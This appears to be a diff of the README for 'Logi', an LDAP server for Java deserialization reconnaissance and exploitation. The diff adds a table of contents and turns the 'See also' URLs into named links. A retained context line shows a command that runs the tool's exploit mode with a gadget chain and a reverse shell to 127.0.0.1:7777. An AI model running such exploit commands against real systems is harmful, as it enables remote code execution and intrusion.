@@ -2,6 +2,11 @@
 Logi is a ldap server focusing on ldap deserialize recon and exploit.
 
 
+- [LOGI](#logi)
+  - [Get started](#get-started)
+  - [How it work](#how-it-work)
+  - [Examples](#examples)
+  - [See also](#see-also)
 
 ## Get started
 Download logi from release.
@@ -63,5 +68,6 @@ Run exploit mode with gadget `cb1v18` with reverse shell to `127.0.0.1:7777`
 ./logi -m 3 -g cb1v18 -s '127.0.0.1:7777'
 ```
 ## See also
-https://github.com/BishopFox/GadgetProbe\
-https://github.com/exp1orer/JNDI-Inject-Exploit
+[GadgetProbe](https://github.com/BishopFox/GadgetProbe)
+
+[JNDI-Inject-Exploit](https://github.com/exp1orer/JNDI-Inject-Exploit)
